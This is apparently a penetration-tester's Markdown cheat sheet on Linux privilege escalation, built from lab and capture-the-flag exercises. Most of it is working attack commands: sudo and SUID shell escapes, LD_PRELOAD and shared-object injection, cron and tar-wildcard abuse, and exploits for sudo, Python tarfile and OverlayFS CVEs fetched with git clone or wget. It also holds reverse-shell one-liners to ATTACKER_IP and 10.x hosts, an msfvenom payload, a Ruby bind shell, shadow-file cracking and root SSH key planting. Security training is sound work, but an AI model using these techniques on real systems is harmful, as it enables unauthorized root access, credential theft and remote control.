# Linux Privilege Escalation

### Basic Manual Enumeration

![alt text](https://miro.medium.com/max/2400/0\*rOZTLGBULgHhS2p\_.png)

```
whoami
pwd
id
```

* See what is listening internally

```
ss -tulpn | grep LISTEN
netstat -antp | grep LISTEN
```

* OS, Kernel & Hostname

```
cat /etc/issue 
cat /proc/version 
hostname 
uname -a
searchsploit linux kernel 3.9
```

* To remove DoS exploits by adding -exclude=”/dos/”

#### Binaries Owned by the root user

* Always run with `-p` so it preserves permissions for the root user!!!!

```
./suid_bash -p
```

* Something Weird
* Check to see if youre in a docker container with

```
ps aux
```

* No hashes in `/etc/shadow` is another pretty good indicator

#### Database files

* Make sure to look for any passwords for the root user in .php files in web root!

#### Quick SUID

* The following command can be used to find all SUID programs on a given system:

```
find /* -user root -perm -4000 -print 2>/dev/null
```

* Find files that the users group can edit

```
find / -group users -type f 2>/dev/null
```

* In the above example users is the name of the group he is in.

#### Sudo -l

* If you have the password, on of the first checks should be

```
sudo -l
```

* If there is an entry like:

```
Matching Defaults entries for www-data on THM-Chal:                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

* Means you can `sudo /usr/bin/perl /home/itguy/backup.pl` with no password
* However you cannot `sudo perl /home/itguy/backup.pl` with no password
* Need to use the absolute paths if they are specified that way!!!

**Taking advantage of SUID files**

* Some administrators will set the SUID bit manually to allow certain programs to be run as them.
* Lets say you're a system administrator and a non-privileged user wants to program that requires it to be run with higher privileges.
* They can set the SUID bit, then the non-privileged user can execute the program without having any extra account permissions set.
* See who a command is running as:

```
$ id
uid=1000(ice-wzl) gid=1000(ice-wzl) groups=1000(ice-wzl) <--cmd output
touch foo
find foo -exec whoami \;
igor <--command output (now get shell as igor)
find foo -exec /bin/bash -p \;
$ id
uid=1000(ice-wzl) gid=1000(ice-wzl) euid=1001(igor)
```

### Custom Binarys

* Cross reference a list of standard binaries on a linux system with the ones you see, admins will add their own sometimes

```
strings system-control
```

#### File Systems

* Use the following command to check for unmounted file systems

```
cat /etc/fstab
```

#### World Writeable

* Files on the system with permissions that can be modifiled by any user on the system

```
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
```

* World writable directories for root

```
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
```

* World writable files

```
find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null
```

### Weak File Permissions

#### Readable shadow

```
ls -l /etc/shadow
cat /etc/shadow
```

* A users password hash (if they have one) can be found between the first and second (:) of each line.
* Save the root user's hash to a file called hash.txt on your kali machine and use john to crack it.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

* Switch to the root user

```
su root
```

**Unshadow method**

```
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt
```

* Transfer both back to attack box

```
unshadow passwd.txt shadow.txt > unshadowed.txt
```

#### Writeable shadow

```
ls -l /etc/shadow
```

* Generate a new password hash

```
mkpasswd -m sha-512 jackiscool
```

* Edit /etc/shadow and replace origional root user's password hash with the one that you just created
* Switch to the root user

```
su root
```

#### Writable passwd

* The /etc/passwd file contained user password hashes, and some versions of Linux still allow password hashes to be stored there
* The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user.

```
ls -l /etc/passwd
```

* Generate a new password hash with a password of your choice:

```
openssl passwd newpasswordhere
```

* Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
* Switch to the root user, using the new password:

```
su root
```

* Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
* Now switch to the newroot user, using the new password:

```
su newroot
```

### Passwords and Keys

#### History Files

* If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
* View the contents of all the hidden history files in the user's home directory:

```
cat ~/.*history | less
```

* Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line.
* Note that there is no space between the -p option and the password!

#### Config Files

* Config files often contain passwords in plaintext or other reversible formats.
* List the contents of the user's home directory:

```
ls /home/user
```

* Note the presence of a myvpn.ovpn config file. View the contents of the file:

```
cat /home/user/myvpn.ovpn
```

* The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

```
su root
```

#### SSH Keys

* Sometimes users make backups of important files but fail to secure them with the correct permissions.
* Look for hidden files & directories in the system root:

```
ls -la /
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

#### Web Application Database Credentials

Search web application files for hardcoded database credentials. Different database users often have different privileges.

```bash
# Search for MySQL/MariaDB connections in PHP
grep -r mysqli_connect /var/www/html/
grep -r mysql_connect /var/www/html/

# Search for PostgreSQL connections in PHP
grep -r pg_connect /var/www/html/

# Example output:
# ./admin/pages/firewall.php:  $dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
# ./admin/pages/users.php:     $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixnss password=fios@ew023xnw");
# ./admin/pages/actions.php:   $dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");

# Search for generic database connection strings
grep -r "password" /var/www/html/*.php 2>/dev/null
grep -r "dbpass" /var/www/html/ 2>/dev/null
grep -r "db_pass" /var/www/html/ 2>/dev/null
```

**Tip:** Different database users may have different privileges. Test each discovered credential for privilege escalation paths (e.g., PostgreSQL NSS user injection).

### Old sudo version

* CVE-2019-14287

```
sudo --version
Sudoers I/O plugin version 1.8.21p2 #output
sudo -l
(ALL, !root) NOPASSWD: /bin/bash #output
```

* Looking for the `(ALL, !root) NOPASSWD:`, and Sudo (versions < 1.8.28). Easy priv esc.

```
sudo -V
Sudo version 1.8.27
Sudoers policy plugin version 1.8.27
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.27

sudo -u#-1 /bin/bash
root@NIX04:/home/ben# 
```

### CVE-2025-32463 - Sudo --chroot Privilege Escalation

* Sudo before 1.9.17p1 allows local users to obtain root access because /etc/nsswitch.conf from a user-controlled directory is used with the --chroot option.

**Detection:**

```bash
sudo -V
# Vulnerable if: Sudo version < 1.9.17p1
```

**Quick Test:**

```bash
sudo -R woot woot
# If you see: "sudo: woot: No such file or directory" = likely vulnerable
```

**Exploit:**

```bash
# Clone exploit
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot

# Run exploit
./sudo-chwoot.sh

# Result
woot!
root@host:/# id
uid=0(root) gid=0(root) groups=0(root)
```

**Reference:** https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

### CVE-2025-4517 - Python tarfile extract filter bypass (symlink/hardlink)

Python 3.8.0–3.13.1: `tarfile.extractall(path=..., filter="data")` (and `extract(..., filter="data")`) can be bypassed when entries use symlinks whose resolved path length exceeds `PATH_MAX`; later symlinks are not fully expanded, allowing path traversal. Combined with hardlinks, an attacker can write arbitrary files (e.g. `/etc/sudoers`, `/root/.ssh/authorized_keys`) during extraction.

**Typical scenario:** A script runs as root and extracts a user-supplied tar with `filter="data"` (e.g. `tar.extractall(path=staging_dir, filter="data")`). User can upload a malicious tar (e.g. to a backup/restore feature) and trigger extraction via something like:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn_9999
```

**Detection:** `grep -r "tarfile\|extractall\|filter="` in the script; look for `filter="data"` or `filter='data'`.

**Exploit:** Build a tar that uses a long symlink chain so resolved path exceeds PATH_MAX, then a symlink escaping to e.g. `/etc`, a hardlink to `sudoers`, and a regular file entry that writes the new sudoers line. PoC scripts exist for adding a sudoers entry or overwriting `authorized_keys`.

```bash
# Example PoC (WingData HTB style)
python3 CVE-2025-4517-POC.py
# Then: cp /tmp/cve_2025_4517_exploit.tar /opt/backup_clients/backups/backup_9999.tar
#       sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn_9999
#       sudo /bin/bash
```

**References:**
* https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f  
* https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData  

### CVE-2023-2640 / CVE-2023-32629 - GameOver(lay) Ubuntu Kernel PrivEsc

OverlayFS vulnerability in Ubuntu kernels allowing local privilege escalation.

**Affected Kernels:**

| Kernel Version | Ubuntu Release |
|----------------|----------------|
| 6.2.0 | Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish) |
| 5.19.0 | Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish) |
| 5.4.0 | Ubuntu 20.04 LTS (Focal Fossa) / Ubuntu 18.04 LTS (Bionic Beaver) |

**Detection:**

```bash
uname -r
# 6.2.0-25-generic  <- Vulnerable

cat /etc/os-release
# Ubuntu 22.04 LTS
```

**Exploit (One-liner):**

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

**Alternative POC:**

```bash
# Download and run
wget https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh
chmod +x exploit.sh
./exploit.sh

# Or manual steps
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
```

**Verify root:**

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

**References:**
- https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629
- https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/

## Without a stabilized shell (webshell / limited shell)

When you only have a webshell or an unstable reverse shell, you can still run some commands without upgrading to a full TTY.

### Running MySQL from the command line

Use **one-shot** `-e "query"` so you don't need an interactive MySQL session. Database name can go at the end.

```bash
# List databases
mysql -u USER -p'PASSWORD' -e "show databases;"

# List tables in a database
mysql -u USER -p'PASSWORD' -e "show tables;" DATABASE_NAME

# Query with vertical output (\G) for readability
mysql -u USER -p'PASSWORD' -e "select * from registration \G" registration
```

No need for a stabilized shell or interactive `mysql>` prompt; each command runs and exits. Use `\G` at the end of the query for vertical (key: value) output.

### su root without a stabilized shell

You can **su root** from a webshell or limited shell: run `su root`, then type the root password when prompted. It works without a full TTY (e.g. from wright.php or a simple `cmd=` shell). After that you are root for subsequent commands in that same request/session.

```bash
su root
Password: <type the password>
id
uid=0(root) gid=0(root) groups=0(root)
```

If you obtained the password from a config file (e.g. DB password reused for a system user), use it here.

---

## Sudo-Shell escape Sequences

* List the programs which sudo allows your user to run:

```
sudo -l
```

Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

### Zip

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
touch hello.txt
sudo /usr/bin/zip 1.zip hello.txt -T --unzip-command="sh -c /bin/bash"
id
uid=0(root) gid=0(root) groups=0(root)
```

```
Sudo -l
```

### npm

* ![alt text](https://miro.medium.com/max/2400/1\*VucdYx033uiuiMXc7ZxIhQ.png)
* ![alt text](https://miro.medium.com/max/2400/1\*0yhB6pvhjXSAJq1BuFPyxA.png)

### journalctl

```
sudo journalctl
!/bin/sh
```

### iftop

```
sudo /usr/bin/iftop
!/bin/bash #hit enter
```

### find

```
sudo /usr/bin/find . -exec /bin/bash \; -quit
sudo /find /bin -name nano -exec /bin/sh \;
```

### Facter (Puppet)

If you can run `sudo /usr/bin/facter` (e.g. `(ALL) NOPASSWD: /usr/bin/facter`), use `--custom-dir` to load a directory containing Ruby code; Facter will execute custom facts as root. Write a Ruby script that runs a shell or bind shell, then point facter at its directory.

**One-liner (exec shell):**

```bash
echo 'exec "chmod +s /bin/bash"' > /tmp/shell.rb
chmod +x /tmp/shell.rb
sudo /usr/bin/facter --custom-dir=/tmp shell.rb x
```

**Bind shell (Ruby, listen on 5555):** Save as `/tmp/s.rb`, then `sudo /usr/bin/facter --custom-dir=/tmp s.rb`. From attacker: `echo "id" | nc TARGET 5555`.

```ruby
#!/usr/bin/env ruby
require 'socket'
require 'open3'
Socket.tcp_server_loop(5555) do |sock, client_addrinfo|
  begin
    while command = sock.gets
      Open3.popen2e("#{command}") do |stdin, stdout_and_stderr|
        IO.copy_stream(stdout_and_stderr, sock)
      end
    end
  rescue
    break if command =~ /IQuit!/
    sock.write "Command or file not found.\n"
    retry
  ensure
    sock.close
  end
end
```

**References:**
* https://gtfobins.github.io/gtfobins/facter/
* https://github.com/secjohn/ruby-shells/blob/master/revshell.rb (Ruby reverse/bind shells)

### nano

```
sudo /usr/bin/nano
Press ctrl+r then ctrl +x 
Reset; bash 1>&0 2>&0
```

### vim

```
sudo vim -c ':!/bin/bash'
```

* Method 2

```
sudo vim -c '!sh'
```

* Method 3

```
:set shell=/bin/sh
:shell
```

### vi

```
:set shell=/bin/sh
:shell
```

### man

```
sudo /usr/bin/man man
!/bin/sh
```

### awk

```
sudo awk 'BEGIN {system("/bin/bash")}'
sudo awk 'BEGIN {system("/bin/sh")}'
```

### less

```
sudo /usr/bin/less /etc/profile
!/bin/sh
```

### FTP

```
sudo /usr/bin/ftp
!/bin/bash
```

### SSH

If you can run ssh with sudo, you can spawn a root shell using the ProxyCommand option:

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/ssh
```

**Method 1 - ProxyCommand:**

```bash
sudo /usr/bin/ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Method 2 - Run command via SSH:**

```bash
sudo ssh -o ProxyCommand="sh -c 'exec sh -i'" localhost
```

**Method 3 - Using PermitLocalCommand:**

```bash
sudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' user@127.0.0.1
```

**Reference:** https://gtfobins.github.io/gtfobins/ssh/

### bee (Backdrop CMS CLI)

If you can run `bee` with sudo, it has a PHP eval command that allows arbitrary code execution.

**Detection:**

```bash
sudo -l
# (ALL : ALL) /usr/local/bin/bee
```

**Exploitation:**

```bash
# Must run from Backdrop CMS root directory (e.g., /var/www/html)
# Or use --root option to specify path

# Method 1 - SUID bash
sudo /usr/local/bin/bee eval 'echo shell_exec("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");'
/tmp/rootbash -p

# Method 2 - Reverse shell
sudo /usr/local/bin/bee eval 'echo shell_exec("bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1");'

# Method 3 - Direct command
sudo /usr/local/bin/bee eval 'echo shell_exec("id");'
```

**Verify:**

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root 1183448 ... /tmp/rootbash

/tmp/rootbash -p
# uid=1001(user) gid=1001(user) euid=0(root) egid=0(root)
```

**Reference:** https://gtfobins.github.io/gtfobins/bee/

---

### nmap

* Method 1

```
TF=$(mktemp)
echo 'os.execute("/bin/bash")' > $TF
sudo nmap --script=$TF
```

* Method 2

```
sudo nmap --interactive
!bash
```

* Method 3

```
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
```

#### more

```
TERM= sudo -E more /etc/profile
!/bin/bash
```

### Apache2

```
sudo -l 
(root) NOPASSWD: /usr/sbin/apache2
sudo apache2 -f /etc/shadow
```

* Copy hash to attacker box and crack with john

### Sudo -l LD\_PRELOAD

* Sudo can be configured to inherit certain environment variables from the user's environment.
* Check which environment variables are inherited (look for the env\_keep+=LD\_PRELOAD options):
* Output you're looking for

```
user@debian:~/tools/sudo$ sudo -l
Matching Default entries for user on this host:
  env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```

* LD\_PRELOAD and LD\_LIBRARY\_PATH are both inherited from the user's environment.
* LD\_PRELOAD loads a shared object before any others when a program is run. LD\_LIBRARY\_PATH provides a list of directories where shared libraries are searched for first.
* Create a shared object using the code located at /home/user/tools/sudo/preload.c:
* preload.c code in another file in this repo:

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

* Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:

```
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

* A root shell should spawn.
* Run ldd against the apache2 program file to see which shared libraries are used by the program:

```
ldd /usr/sbin/apache2
```

* Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:

```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

* Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

```
sudo LD_LIBRARY_PATH=/tmp apache2
```

* A root shell should spawn.
* Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again.
* Did it work? If not, try to figure out why not, and how the library\_path.c code could be changed to make it work.

#### Sudo script: env_keep and unquoted `[ -z $VAR ]` (e.g. CHECK_CONTENT)

If a sudoers entry has `env_keep+=CHECK_CONTENT` (or similar) and the allowed script uses **unquoted** `$VAR` in a test and later runs `$VAR` as a command, you can set that variable to a shell.

**Example script logic:**

```bash
if [ -z $CHECK_CONTENT ]; then
  CHECK_CONTENT=false
fi
# ... later, when moving a symlink to quarantine:
if $CHECK_CONTENT; then
  /usr/bin/echo "Content:"
  /usr/bin/cat $QUAR_DIR/$LINK_NAME
fi
```

* **`-z $CHECK_CONTENT`** — In bash, `-z` tests "string length zero". So when `CHECK_CONTENT` is unset or empty, the script sets `CHECK_CONTENT=false`. The variable is **unquoted** (`$CHECK_CONTENT` not `"$CHECK_CONTENT"`), which is required for this class of bug.
* Because `env_keep+=CHECK_CONTENT` is in sudoers, your environment value is passed into the script. Set `CHECK_CONTENT=/bin/bash` (or `/bin/sh`). Then:
  1. `[ -z $CHECK_CONTENT ]` is false (variable is set), so the script does not overwrite it.
  2. When the script runs `if $CHECK_CONTENT;then`, it **executes** the value of `CHECK_CONTENT` as a command, i.e. runs `/bin/bash` as root.

**Exploitation:**

```bash
# Create a symlink that passes the script's checks (e.g. not matching etc|root), with .png extension
ln -s /path/to/harmless /tmp/x.png
sudo CHECK_CONTENT=/bin/bash /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/x.png
# Root shell
```

The script must take a path that gets moved to quarantine and then hit the `if $CHECK_CONTENT;then` branch. The symlink target must not match any blocklist (e.g. `etc|root`) in the script so the link is moved rather than unlinked.

#### Sudo -l LD\_PRELOAD Method 2

1. In command prompt type: sudo -l
2. From the output, notice that the LD\_PRELOAD environment variable is intact.

* Exploitation
*
  1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

*
  1. Save the file as x.c
*
  1. In command prompt type:

```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```

*
  1. In command prompt type:

```
sudo LD_PRELOAD=/tmp/x.so apache2
```

*
  1. In command prompt type: `id`

### Sudo -l Service Takeover

* ![alt text](https://miro.medium.com/max/2400/1\*2HVtq5qvZtanx0WlzaN8dg.png)
* We have write access to `vulnnet-auto.timer` and `vulnnet.job.service` which are custom services on the host
* ![alt text](https://miro.medium.com/max/2400/1\*eZ7VQJlIzjIvj4elIpWr9A.png)
* First we modify the `OnCalandar=*:0/30` line to `OnCalandar=*0/1` to make it run every minute versus every 30 minutes
* ![alt text](https://miro.medium.com/max/2400/1\*UNBgv24NMzWawzj2U7qk2g.png)
* Can see that the system executes the `/bin/df` command
* ![alt text](https://miro.medium.com/max/2400/1\*N-S2p6n1i2Q17nLlavjwBQ.png)
* We can modify this to spawn a reverse shell via our script
* Can also call a reverse shell on the box

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.22.22 1111 >/tmp/f
bash -i >& /dev/tcp/10.13.22.22/1111 0>&1
```

* We then use our `sudo -l` privlages to restart the service
* ![alt text](https://miro.medium.com/max/2400/1\*JZqSzROFnTD6fNHWEHGSpw.png)

### Nginx Sudo Privilege Escalation (WebDAV Method)

If you can run `sudo /usr/sbin/nginx` (NOPASSWD), exploit via custom config with WebDAV to write files as root.

**Detection:**

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

**Create malicious nginx config (`/tmp/nginx_pwn.conf`):**

```nginx
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
    worker_connections 768;
}
http {
    server {
        listen 1339;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

**Exploitation:**

```bash
# 1. Start nginx with malicious config
sudo /usr/sbin/nginx -c /tmp/nginx_pwn.conf

# 2. Verify it's running
netstat -antpu | grep 1339

# 3. Generate SSH key (if needed)
ssh-keygen -t ed25519

# 4. Write SSH key to root's authorized_keys
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"

# 5. SSH as root
ssh root@localhost -i ~/.ssh/id_ed25519
```

**One-liner (from attacker box with existing key):**

```bash
curl -X PUT TARGET:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_ed25519.pub)"
ssh root@TARGET -i ~/.ssh/id_ed25519
```

**Reference:** https://gist.github.com/DylanGrl/ab497e2f01c7d672a80ab9561a903406

### SUID SYMLINKS CVE-2016-1247

* Detection

```
dpkg -l | grep nginx
```

* Looking for installed nginx version is below 1.6.2-5+deb8u3
* Required you to be the www-data user!
* Run:

```
/tmp/nginxed-root.sh /var/log/nginx/error.log
```

* System will wait for logrotate to execute, become root user

### Cron Jobs File permissions

* Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
* Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at `/etc/crontab`.
* View the contents of the system-wide crontab:

```
cat /etc/crontab
```

* There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
* Locate the full path of the overwrite.sh file:

```
locate overwrite.sh
```

* Note that the file is world-writable:

```
ls -l /usr/local/bin/overwrite.sh
```

* Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

* Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.

```
nc -nvlp 4444
```

#### Cron Jobs File permissions Method 2

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

* Wait the defined period of time

```
/tmp/bash -p
id
```

### Cron Jobs Path Environment Variable

* View the contents of the system-wide crontab:

```
cat /etc/crontab
```

* Note that the PATH variable starts with /home/user which is our user's home directory.
* Create a file called overwrite.sh in your home directory with the following contents:

```
#!/bin/bash
 
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

* Make sure that the file is executable:

```
chmod +x /home/user/overwrite.sh
```

* Wait for the cron job to run. Run the `/tmp/rootbash` command with `-p` to gain a shell running with root privileges:

```
/tmp/rootbash -p
```

### CronJobs - Wildcards

* View the contents of the other cron job script:

```
cat /usr/local/bin/compress.sh
```

* Note that the tar command is being run with a wildcard (\*) in your home directory.
* Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
* Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

* Transfer the shell.elf file to /home/user/ on the Debian VM.

```
chmod +x /home/user/shell.elf
```

* Create these two files in /home/user:

```
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

* When the tar command in the cron job runs, the wildcard (\*) will expand to include these files.
* Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.
* Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.

```
nc -nvlp 4444
```

#### CronJobs - Wildcards No msfvenom

```
echo 'cp /bin/bash /tmp/bash;chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

* Wait the 1 minute or time defined by cron settings
* Once the cronjob hits run:

```
/tmp/bash -p
id
```

### SUID and SGID Executables --GTFO Bins

* Find all the SUID/SGID executables on the Debian VM:

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

* Note that /usr/sbin/exim-4.84-3 appears in the results. Exploit is in this repo.
* Exploit-DB, Google, and GitHub are good places to search!
* Check GTFO Bins and Google for SUID/SGID!!!

### SUID-Shared Object Injection

* Detection

```
find / -type f -perm -04000 -ls 2>/dev/null
```

* Make note of all the SUID binaries
* The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.
* First, execute the file and note that currently it displays a progress bar before exiting:
* Run strace on the file and search the output for open/access calls and for "no such file" errors:

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

* Output Looking for

```
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

* Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
* Create the .config directory for the `libcalc.so` file:

```
mkdir /home/user/.config
```

* Example shared object code can be found at `/home/user/tools/suid/libcalc.c`. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
IF ERRORS TRY:
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

* Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

```
/usr/local/bin/suid-so
```

* It will be an euid=0 not a uid=0!!!

### SUID and SGID Environment Variables

* Detection

```
find / -type f -perm -04000 -ls 2>/dev/null
```

* The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
* First, execute the file and note that it seems to be trying to start the apache2 webserver:

```
/usr/local/bin/suid-env
```

* Run strings on the file to look for strings of printable characters:

```
strings /usr/local/bin/suid-env
```

* One line `service apache2 start` suggests that the service executable is being called to start the webserver, however the full path of the executable `/usr/sbin/service` is not being used.

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

* Compile the code `service.c` into an executable called service. This code simply spawns a Bash shell:

```
gcc /tmp/service.c -o /tmp/service
```

* Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

```
export PATH=/tmp:$PATH
```

* Rin the executable with an absolute path

```
/usr/local/bin/suid-env
id
```

### SUID and SGID Executables-Abusing Shell Features 1

* Detection

```
 find / -type f -perm -04000 -ls 2>/dev/null
```

* Make note of all the SUID binaries
* The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable `/usr/sbin/service` to start the apache2 webserver. Verify this with strings:

```
strings /usr/local/bin/suid-env2
```

* In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
* Verify the version of Bash installed on the Debian VM is less than 4.2-048:

```
/bin/bash --version
```

Create a Bash function with the name `/usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

* Run the suid-env2 executable to gain a root shell:

```
/usr/local/bin/suid-env2
```

#### SUID and SGID Executables-Abusing Shell Features 2

* Note: This will not work on Bash versions 4.4 and above.
* When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
* Run the `/usr/local/bin/suid-env2` executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of `/bin/bash`:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run the `/tmp/rootbash` executable with -p to gain a shell running with root privileges:

```
/tmp/rootbash -p
```

* OR One liner

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### NFS

* Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
* Check the NFS share configuration:

```
cat /etc/exports
```

* Note that the /tmp share has root squashing disabled.
* On your Kali box, switch to your root user if you are not already running as root:

```
sudo su
```

* Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

```
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
```

* Alternative command

```
mount -t nfs -v 10.10.185.59:/ /tmp/nfs
```

